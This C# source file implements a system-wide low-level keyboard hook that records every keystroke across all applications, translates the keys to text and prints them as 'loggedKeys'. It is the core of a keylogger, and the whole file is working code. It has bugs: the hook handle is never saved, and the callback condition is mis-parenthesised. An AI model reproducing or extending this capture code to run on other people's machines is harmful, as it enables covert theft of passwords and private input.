using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Drno.Libraries
{
    class Keyboard
    {
        // Dll imports below
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idhook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int ToUnicodeEx(uint virtualKeyCode, uint scanCode, byte[] keyboardState, 
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer, int bufferSize, uint flags, IntPtr dwhkl);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        // Class object declarations below
        private LowLevelKeyboardProc keyboardProc;
        private IntPtr hookId = IntPtr.Zero;

        Keyboard()
        {
            
        }

        public IntPtr setHook(LowLevelKeyboardProc keyboardProc)
        {
            const int WH_KEYBOARD_LL = 13;

            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(currentModule.ModuleName), 0);
            }
        }

        public void unHook()
        {
            UnhookWindowsHookEx(hookId);
        }

        public IntPtr callBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            const int WM_KEYDOWN = 0x0100;
            const int WM_SYSKEYDOWN = 0x0104;

            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN || wParam == (IntPtr) WM_SYSKEYDOWN)
            {
                uint vkCode = (uint) Marshal.ReadInt32(lParam);
                string loggedKeys = getCharsFromVkCode(vkCode);
                Console.Write(loggedKeys);
            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        public string getCharsFromVkCode(uint vkCode)
        {
            var buffer = new StringBuilder(256);
            var keyboardState = new byte[256];
            bool bKeyStateStatus = GetKeyboardState(keyboardState);

            if (!bKeyStateStatus)
                return "";
            uint lScanCode = MapVirtualKey(vkCode, 0);
            IntPtr hkl = GetKeyboardLayout(0);

            ToUnicodeEx(vkCode, lScanCode, keyboardState, buffer, 256, 0, hkl);
            return buffer.ToString();
        }
    }
}
